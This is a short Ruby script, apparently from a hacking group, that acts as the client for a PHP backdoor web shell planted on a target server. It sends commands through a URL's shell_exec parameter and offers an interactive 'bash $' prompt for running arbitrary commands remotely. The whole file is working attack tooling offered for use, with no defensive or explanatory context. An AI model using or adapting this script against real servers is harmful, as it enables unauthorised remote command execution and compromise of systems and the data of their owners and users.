#!/usr/bin/ruby

#Created By Myanmar Noob Hackers

require 'open-uri'

if ARGV.length == 0
	puts "\n"
	puts "\t[!] CMD Backdoor Shell [!]\n\n"
    puts "Usage: ruby connect.rb http://target.com/server.php\n\n"
    exit
end

#if shell_exec function is disable,u can change system,passthru,etc...

def getdata(url,cmd)
	full_url = "#{url}?function=shell_exec&cmd=#{cmd}"
	open(full_url) do |uri|
	data = uri.read
	print data
end
end
system 'clear'
puts "Connected to #{ARGV[0]}"
getdata("#{ARGV[0]}",'uname -a')
print "Current Patch : "
getdata("#{ARGV[0]}",'pwd')
puts "\n"
while true
	url = ARGV[0]
	print "bash $ "
	cmd = STDIN.gets.chomp()
	if cmd == "exit"
		puts "Bye.. Happy Hacking :)"
		exit
	elsif cmd == "clear"
		system 'clear'
	else 
		getdata(url,cmd)
	end

end
